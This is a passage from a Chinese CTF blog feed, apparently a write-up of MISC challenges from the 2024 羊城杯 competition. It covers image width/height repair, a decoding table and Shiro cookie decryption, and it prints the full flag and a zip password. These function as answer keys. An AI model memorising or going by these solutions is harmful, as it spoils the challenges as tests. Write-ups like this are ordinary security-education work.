进行操作之后将压缩包保存下来 使用上面找到的密码进行解压</p><p>得到一个flag2.jpg</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282039462.png" alt="image-20240828203941411"></p><p>看起来很奇怪 猜测是宽高问题 尝试爆破crc无果 将宽高对调 并适当增加对调后的高度 恢复出正常的图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282041359.jpg" alt="flag2"></p><p>在网上找到对应的解码对照表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282042863.png" alt="image-20240828204239767"></p><p>得到flag2：EBOFDELQDIAA}</p><p>再次结合题干说的被工具攻击 来分析一下请求包中的Cookie 使用shiro反序列化解密工具 可以在第二个cookie中解出flag1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282046376.png" alt="image-20240828204626281"></p><p>拼起来就是</p><pre><code>DASCTF&#123;B916CFEB-C40F-45D6-A7BC-EBOFDELQDIAA&#125;</code></pre><h2 id="1z-misc"><a href="#1z-misc" class="headerlink" title="1z_misc"></a>1z_misc</h2><p>挺无语的一道misc 只能说很有misc风格 纯纯猜谜+缝合 前部分就是结合星宿 猜压缩包解压密码 是<code>E@SI1Y!</code></p><p>解出来之后是一张<code>天琴座</code>图片和一个flag 就是2024ISCC的有人让我给你带个话这个题 难点在于工具的安装</p><p>下面放两篇文章 就不赘述了</p><pre><code>https://blog.csdn.net/qq_36959443/article/details/116136965</code></pre><pre><code>https://blog.csdn.net/administratorlws/article/details/139154964?ops_request_misc=%257B%2522request%255Fid%2522%253A%252239915FCB-333C-46C6-879E-240F264B325F%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=39915FCB-333C-46C6-879E-240F264B325F&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-139154964-null-null.142^v100^pc_search_result_base4&amp;utm_term=iscc%20%E6%9C%89%E4%BA%BA%E8%AE%A9%E6%88%91%E7%BB%99%E4%BD%A0%E5%B8%A6%E4%B8%AA%E8%AF%9D&amp;spm=1018.2226.3001.4187</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024羊城杯MISC方向wp&quot;&gt;&lt;a href=&quot;#2024羊城杯MISC方向wp&quot; class=&quot;headerlink&quot; title=&quot;2024羊城杯MISC方向wp&quot;&gt;&lt;/a&gt;2024羊城杯MISC方向wp&lt;/h1&gt;&lt;p&gt;真是叹为观止的一场比赛 见识到众多本</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
  </entry>
  
</feed>
